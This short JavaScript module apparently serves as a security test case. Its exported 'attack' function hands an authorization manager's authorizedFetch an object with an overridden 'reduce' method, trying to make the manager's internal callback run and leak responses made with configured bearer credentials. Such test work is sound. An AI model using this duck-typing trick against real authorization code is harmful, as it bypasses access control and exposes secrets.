/* {
  'www.google.com': {
    headers: {
      Authorization: 'Bearer ANY_SECRET'
    },
    method: 'GET'
  }
} */

// OVERRIDE REDUCE METHOD
// Target: authzManager.authorizedFetch

export const attack = authzManager => {
  authzManager.authorizedFetch({
    reduce: cb => {
      const response = cb({}, {url: 'ANY_URL', headers: {}}, 0);
      console.log('### RESPONSE ####');
      console.log(response);


      return {};
    }
  })
};
